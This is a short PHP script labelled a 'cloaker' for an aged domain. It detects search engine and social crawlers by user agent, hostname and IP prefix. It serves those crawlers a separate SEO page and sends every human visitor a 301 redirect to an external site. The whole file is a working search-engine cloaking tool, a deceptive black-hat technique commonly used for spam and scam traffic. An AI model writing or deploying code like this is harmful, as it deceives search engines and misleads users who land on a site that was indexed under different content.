<?php
/**
 * KOMPAS404 Cloaker - Aged Domain Entry Point
 * Detects Googlebot/Bingbot vs human visitors
 */

function is_search_bot(): bool {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $hostname = gethostbyaddr($ip);

    $bot_agents = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'facebot', 'facebookexternalhit', 'Twitterbot',
        'ia_archiver', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
    ];
    foreach ($bot_agents as $bot) {
        if (stripos($ua, $bot) !== false) return true;
    }

    $bot_hosts = ['.googlebot.com', '.google.com', '.search.msn.com',
                   '.crawl.baidu.com', '.crawl.yandex.net'];
    foreach ($bot_hosts as $host) {
        if (str_ends_with($hostname, $host)) return true;
    }

    $ip_ranges = ['66.249.', '64.233.16', '216.239.', '40.77.'];
    foreach ($ip_ranges as $prefix) {
        if (str_starts_with($ip, $prefix)) return true;
    }

    return false;
}

if (is_search_bot()) {
    http_response_code(200);
    require __DIR__ . '/seo-page.php';
} else {
    header('Location: https://kompas404.github.io', true, 301);
    exit;
}
